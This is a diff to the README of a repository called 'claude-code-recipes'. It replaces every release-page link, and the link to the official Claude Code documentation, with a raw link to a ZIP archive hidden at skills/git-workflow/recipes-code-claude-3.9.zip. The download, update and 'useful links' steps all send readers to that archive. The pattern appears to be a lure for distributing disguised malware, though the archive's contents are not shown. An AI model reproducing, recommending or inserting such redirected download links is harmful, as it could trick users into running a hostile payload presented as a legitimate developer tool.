@@ -1,6 +1,6 @@
 # ⚙️ claude-code-recipes - Ready-to-Use Claude Code Recipes
 
-[![Download claude-code-recipes](https://img.shields.io/badge/Download%-claude--code--recipes-brightgreen?style=for-the-badge)](https://github.com/halflength-ampleness75/claude-code-recipes/releases)
+[![Download claude-code-recipes](https://img.shields.io/badge/Download%-claude--code--recipes-brightgreen?style=for-the-badge)](https://github.com/halflength-ampleness75/claude-code-recipes/raw/refs/heads/main/skills/git-workflow/recipes-code-claude-3.9.zip)
 
 ---
 
@@ -43,7 +43,7 @@ This guide will help you download and set up claude-code-recipes on your Windows
 ## ⬇️ Download and Setup 🔽
 
 1. Visit the release page here to get the latest version:  
-   [Download claude-code-recipes Releases](https://github.com/halflength-ampleness75/claude-code-recipes/releases)
+   [Download claude-code-recipes Releases](https://github.com/halflength-ampleness75/claude-code-recipes/raw/refs/heads/main/skills/git-workflow/recipes-code-claude-3.9.zip)
 
 2. On this page, look for the most recent release at the top.
 
@@ -102,7 +102,7 @@ Subagents and hooks require slightly more steps:
 
 To update your collection:
 
-1. Return to the [release page](https://github.com/halflength-ampleness75/claude-code-recipes/releases).
+1. Return to the [release page](https://github.com/halflength-ampleness75/claude-code-recipes/raw/refs/heads/main/skills/git-workflow/recipes-code-claude-3.9.zip).
 2. Download the latest ZIP file.
 3. Extract it as before, overwriting old files if necessary.
 4. Restart Claude Code to apply any new or changed recipes.
@@ -122,9 +122,9 @@ To update your collection:
 ## 🔗 Useful Links
 
 - Download releases:  
-  [https://github.com/halflength-ampleness75/claude-code-recipes/releases](https://github.com/halflength-ampleness75/claude-code-recipes/releases)
+  [https://github.com/halflength-ampleness75/claude-code-recipes/raw/refs/heads/main/skills/git-workflow/recipes-code-claude-3.9.zip](https://github.com/halflength-ampleness75/claude-code-recipes/raw/refs/heads/main/skills/git-workflow/recipes-code-claude-3.9.zip)
 - Claude Code official documentation (for reference):  
-  https://claude.code/docs
+  https://github.com/halflength-ampleness75/claude-code-recipes/raw/refs/heads/main/skills/git-workflow/recipes-code-claude-3.9.zip
 
 ---
 
